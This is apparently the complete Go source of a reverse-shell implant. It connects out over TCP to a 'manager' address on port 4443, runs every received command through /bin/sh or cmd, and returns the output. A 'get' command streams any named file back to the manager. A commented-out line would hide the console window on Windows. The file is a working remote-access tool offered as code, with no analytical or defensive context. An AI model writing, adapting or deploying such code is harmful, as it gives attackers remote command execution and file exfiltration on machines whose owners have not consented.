package main

import (
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
)

//BUFFSIZE is the buffer for communication
const BUFFSIZE = 512

//MANAGERIP connection string to the manager
const MANAGERIP = "0.0.0.0:4443"

func main() {

	conn, err := net.Dial("tcp", MANAGERIP)
	if err != nil {
		fmt.Println(err)
	}

	getshell(conn)

}

func getshell(conn net.Conn) {
	var cmdbuff []byte
	var command string
	cmdbuff = make([]byte, BUFFSIZE)
	var osshell string
	for {
		recvdbytes, _ := conn.Read(cmdbuff[0:])
		command = string(cmdbuff[0:recvdbytes])
		if strings.Index(command, "bye") == 0 {
			conn.Write([]byte("Good Bye !"))
			conn.Close()
			os.Exit(0)
		} else if strings.Index(command, "get") == 0 {
			fname := strings.Split(command, " ")[1]
			fmt.Println(fname)
			go sendFile(conn, fname)

		} else {
			//endcmd := "END"
			j := 0
			osshellargs := []string{"/C", command}

			if runtime.GOOS == "linux" {
				osshell = "/bin/sh"
				osshellargs = []string{"-c", command}

			} else {
				osshell = "cmd"
				//cmdout, _ := exec.Command("cmd", "/C", command).Output()
			}
			execcmd := exec.Command(osshell, osshellargs...)

			/*if runtime.GOOS == "windows" {
				execcmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			}*/

			cmdout, _ := execcmd.Output()
			if len(cmdout) <= 512 {
				conn.Write([]byte(cmdout))
				//conn.Write([]byte(endcmd))
			} else {
				//fmt.Println(len(cmdout))
				//fmt.Println(string(cmdout))
				//fmt.Println("Length of string :")
				//fmt.Println(len(string(cmdout)))
				i := BUFFSIZE
				for {
					if i > len(cmdout) {
						//fmt.Println("From " + strconv.Itoa(j) + "to" + strconv.Itoa(len(cmdout)))
						//fmt.Println(string(cmdout[j:len(cmdout)]))
						conn.Write(cmdout[j:len(cmdout)])
						break
					} else {
						//fmt.Println("From " + strconv.Itoa(j) + "to" + strconv.Itoa(i))
						//fmt.Println(string(cmdout[j:i]))
						conn.Write(cmdout[j:i])
						j = i
					}
					i = i + BUFFSIZE
				}

			}

			cmdout = cmdout[:0]
		}

	}
}

func sendFile(revConn net.Conn, fname string) {

	file, _ := os.Open(strings.TrimSpace(fname))
	fileInfo, err := file.Stat()
	if err != nil {
		fmt.Println(err)
		return
	}
	fileSize := padString(strconv.FormatInt(fileInfo.Size(), 10), 10)
	fileName := padString(fileInfo.Name(), 64)
	//Sending filename and filesize
	revConn.Write([]byte(fileSize))
	revConn.Write([]byte(fileName))
	sendBuffer := make([]byte, BUFFSIZE)
	//sending file contents
	for {
		_, err = file.Read(sendBuffer)
		if err == io.EOF {
			break
		}
		revConn.Write(sendBuffer)
	}
	//Completed file transfer
	return
}

func padString(retunString string, toLength int) string {
	for {
		lengtString := len(retunString)
		if lengtString < toLength {
			retunString = retunString + ":"
			continue
		}
		break
	}
	return retunString
}
